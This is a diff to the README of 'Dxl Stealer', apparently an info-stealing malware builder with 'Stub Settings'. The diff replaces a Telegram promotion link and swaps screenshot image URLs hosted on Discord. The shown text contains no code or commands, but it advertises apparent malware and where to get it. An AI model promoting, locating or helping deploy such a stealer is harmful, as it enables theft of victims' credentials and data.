@@ -1,6 +1,6 @@
 <h1 align="center">
    Dxl Stealer 
-[💥telegram dxl stealer💥](https://t.me/dxlstealer)
+https://t.me/dxlstealer
 </h1>
 <p align= "center">
    <kbd>
@@ -101,8 +101,8 @@ Dxl
 
 <!-- Screenshots Section -->
 <h2 id="screenshots">Screenshots 📸</h2>
-<img src="https://cdn.discordapp.com/attachments/1195392912633110548/1291772365604393083/RurgneyI.jpg?ex=67015043&is=66fffec3&hm=0046e6fc58a09da546d7f9ceebdb1ba7645cbe0f364053cc943c6d699fb3aab9&"Application Screenshot">
-<img src="https://cdn.discordapp.com/attachments/1195392912633110548/1291772365260324936/ulXWfnNo.jpg?ex=67015043&is=66fffec3&hm=c63057d093856ce6e7f9f60747058f72f1e49f4c081d5252c4f634c2b548dbe5&" alt="Application Screenshot">
+<img src="https://cdn.discordapp.com/attachments/1195392912633110548/1291803240093978664/igt3sajg.jpeg?ex=67080484&is=6706b304&hm=73426c8218f6946890e1dc51be601b539ca7f0f8615f6eb9af94f0f49646d648&"Application Screenshot">
+<img src="https://cdn.discordapp.com/attachments/1195392912633110548/1291803239494451311/dm1zrMc0.jpeg?ex=67080484&is=6706b304&hm=194bb2ee091f6c561470beff1c9cf1701d64a1078f7959fde20dad131cd97e57&" alt="Application Screenshot">
 
 
 ## Stub Settings
